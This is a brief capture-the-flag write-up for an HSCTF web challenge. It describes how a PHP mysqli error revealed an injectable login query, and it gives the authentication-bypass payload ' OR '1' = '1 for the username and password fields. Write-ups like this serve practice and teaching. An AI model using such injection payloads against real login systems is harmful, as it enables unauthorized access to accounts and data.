# S-Q-L

# Description:
Written by: dwang

> Keith keeps trying to keep his flag safe. This time, he used a database and some PHP.
>
> https://s-q-l.web.chal.hsctf.com/

# Solution:
- Try entering some unexpected input and you'll soon get a php mysqli error like this:
```
Warning
: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in
/var/www/html/index.php
on line
5
```
- Now we can imagine the query looks something like this: `"SELECT * FROM users WHERE username = '" + $_GET["username"] + "' AND password = '" + $_GET["password"] + "'`

- To exploit this, use something like:
	- Username: `' OR '1' = '1`
	- Password: `1' OR '1' = '1`
